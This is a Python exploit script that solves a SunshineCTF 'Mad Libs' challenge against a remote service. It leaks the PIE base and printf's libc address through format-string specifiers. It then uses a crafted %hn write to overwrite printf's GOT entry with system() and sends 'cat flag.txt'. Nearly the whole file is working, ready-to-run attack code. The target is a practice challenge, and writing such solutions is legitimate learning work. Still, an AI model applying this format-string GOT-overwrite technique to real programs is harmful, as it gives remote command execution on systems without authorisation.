#!/usr/bin/env python3
"""Recover the Mad Libs flag from the remote service."""

import argparse
import re
import socket
import struct


DEFAULT_HOST = "chal.sunshinectf.games"
DEFAULT_PORT = 26001
MAIN_OFFSET = 0x11C9
PRINTF_GOT_OFFSET = 0x4010
PRINTF_OFFSET = 0x600F0
SYSTEM_OFFSET = 0x58740
BUFFER_OFFSET = 0x80


def recv_until(sock: socket.socket, marker: bytes) -> bytes:
    data = bytearray()
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            raise RuntimeError(f"connection closed before {marker!r}")
        data.extend(chunk)
    return bytes(data)


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


def make_write_line(got_address: int, system_address: int) -> bytes:
    first_argument = 8 + BUFFER_OFFSET // 8
    writes = sorted(
        (
            (system_address >> (16 * index)) & 0xFFFF,
            got_address + 2 * index,
        )
        for index in range(3)
    )

    pieces = []
    count = 0
    for index, (value, _address) in enumerate(writes):
        width = (value - count) & 0xFFFF
        if width == 0:
            width = 0x10000
        pieces.append(f"%1${width}c%{first_argument + index}$hn".encode("ascii"))
        count = value

    fmt = b"".join(pieces)
    if len(fmt) >= BUFFER_OFFSET:
        raise RuntimeError("formatted write does not fit before the address table")

    line = (
        fmt
        + b"\0" * (BUFFER_OFFSET - len(fmt))
        + b"".join(p64(address) for _value, address in writes)
        + b"\n"
    )
    if len(line) >= 256:
        raise RuntimeError("input line exceeds the program's read limit")
    return line


def solve(host: str, port: int) -> bytes:
    with socket.create_connection((host, port), timeout=8) as sock:
        sock.settimeout(8)
        recv_until(sock, b"(1) > ")

        sock.sendall(b"%47$p\n")
        first = recv_until(sock, b"(2) > ")
        match = re.search(rb"0x([0-9a-fA-F]+)", first)
        if not match:
            raise RuntimeError("could not read the PIE address")
        pie_base = int(match.group(1), 16) - MAIN_OFFSET
        printf_got = pie_base + PRINTF_GOT_OFFSET

        slot = 8 + BUFFER_OFFSET // 8
        prefix = f"LIBC:%{slot}$s!".encode("ascii")
        leak_line = (
            prefix
            + b"\0" * (BUFFER_OFFSET - len(prefix))
            + p64(printf_got)
            + b"\n"
        )
        sock.sendall(leak_line)
        second = recv_until(sock, b"(3) > ")
        start = second.find(b"LIBC:")
        end = second.rfind(b"!")
        if start < 0 or end <= start + len(b"LIBC:"):
            raise RuntimeError("could not read the printf address")
        leaked_printf = second[start + len(b"LIBC:") : end]
        if len(leaked_printf) != 6:
            raise RuntimeError(f"unexpected printf address bytes: {leaked_printf!r}")

        libc_base = int.from_bytes(leaked_printf, "little") - PRINTF_OFFSET
        if libc_base & 0xFFF:
            raise RuntimeError("the supplied libc offsets do not match this service")
        system_address = libc_base + SYSTEM_OFFSET

        write_line = make_write_line(printf_got, system_address)
        sock.sendall(write_line + b"cat flag.txt\n" + b"true\n" * 4)

        output = bytearray()
        try:
            while True:
                chunk = sock.recv(8192)
                if not chunk:
                    break
                output.extend(chunk)
        except TimeoutError:
            pass

    flag = re.search(rb"sun\{[^}\r\n]+\}", output)
    if not flag:
        raise RuntimeError("the service response did not contain a SunshineCTF flag")
    return flag.group(0)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--port", default=DEFAULT_PORT, type=int)
    args = parser.parse_args()
    print(solve(args.host, args.port).decode("ascii"))


if __name__ == "__main__":
    main()
